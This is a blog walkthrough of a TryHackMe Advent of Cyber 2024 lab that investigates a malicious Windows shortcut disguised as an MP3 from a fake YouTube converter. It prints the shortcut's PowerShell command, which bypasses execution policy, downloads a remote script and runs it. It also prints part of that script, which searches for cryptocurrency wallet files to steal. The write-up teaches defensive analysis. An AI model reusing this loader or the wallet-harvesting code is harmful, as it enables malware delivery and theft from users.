---
title: "TryHackMe: Advent Of Cyber 2024 Day 1"
categories: [TryHackMe]
tags: [opsec, advent of cyber]
render_with_liquid: false
img_path: /images/tryhackme_aoc2024_day1/
image:
  path: banner.png
---

McSkidy's fingers flew across the keyboard, her eyes narrowing at the suspicious website on her screen. She had seen dozens of malware campaigns like this. This time, the trail led straight to someone who went by the name "Glitch."

"Too easy," she muttered with a smirk.

"I still have time," she said, leaning closer to the screen. "Maybe there's more."

Little did she know, beneath the surface lay something far more complex than a simple hacker's handle. This was just the beginning of a tangled web unravelling everything she thought she knew.


![Tryhackme Room Link](bell.svg){: width="1152" height="300" .shadow }
_<https://tryhackme.com/r/room/adventofcyber2024>_



![](home.png){: width="900" height="800"}



## Learning Objectives

- Learn how to investigate malicious link files.
- Learn about OPSEC and OPSEC mistakes.
- Understand how to track and attribute digital identities in cyber investigations.


## Investigating the Website

The website we are investigating is a Youtube to MP3 converter currently being shared amongst the organizers of SOC-mas. You've decided to dig deeper after hearing some concerning reports about this website.

![Glitch All-In-One Converter](converter.png){: width="1321" height="726"}


### Youtube to MP3 Converter Websites

These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:

Malvertising: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
Phishing scams: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
Bundled malware: Some converters may come with malware, tricking users into unknowingly running it.

### Getting Some Tunes
Let's find out by pasting any YouTube link in the search form and pressing the "Convert" button. Then select either mp3 or mp4 option. This should download a file that we could use to investigate. For example, we can use https://www.youtube.com/watch?v=dQw4w9WgXcQ, a classic if you ask me.

Once downloaded, navigate to your Downloads folder or if you are using the AttackBox, to your /root/ directory. Locate the file named download.zip, right-click on it, and select Extract To. In the dialog window, click the Extract button to complete the extraction.


![](extract.png){: width="1209" height="1429"}

You'll now see two extracted two files: **song.mp3** and **somg.mp3.**

To quickly determine the file's contents, double-click on the "Terminal" icon on the desktop then run the file command on each one. First, let's try checking **song.mp3.**

```console
user@tryhackme:~$ file song.mp3
download.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

There doesn't seem to be anything suspicious, according to the output. As expected, this is just an MP3 file.

How about the second file **somg.mp3**? From the filename alone, we can tell something is not right. Still, let's confirm by running the **file** command on it anyway.

```console
user@tryhackme:~$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
```

Now, this is more interesting!

The output tells us that instead of an MP3, the file is an "MS Windows shortcut", also known as a **.lnk** file. This file type is used in Windows to link to another file, folder, or application. These shortcuts can also be used to run commands! If you've ever seen the shortcuts on a Windows desktop, you already know what they are.

There are multiple ways to inspect **.lnk** files to reveal the embedded commands and attributes. For this room, however, we'll use ExifTool, which is already installed on this machine.

To do this, go back to your Terminal and type:

```console
user@tryhackme:~$ exiftool somg.mp3
```

Look through the output to locate the command used as a shortcut in the **somg.mp3** file. If you scroll down through the output, you should see a PowerShell command.

```console
...
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
user@tryhackme:~# 
```

What this PowerShell command does:

- The **-ep Bypass -nop** flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
- The **DownloadFile** method pulls a file (in this case, IS.ps1) from a remote server (https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1) and saves it in the **C:\\ProgramData\\** directory on the target machine.
- Once downloaded, the script is executed with PowerShell using the **iex** command, which triggers the downloaded **s.ps1** file.

If you visit the contents of the file to be downloaded using your browser **(https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)**, you will see just how lucky we are that we are not currently using Windows.

```console
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

[Output truncated for brevity]
```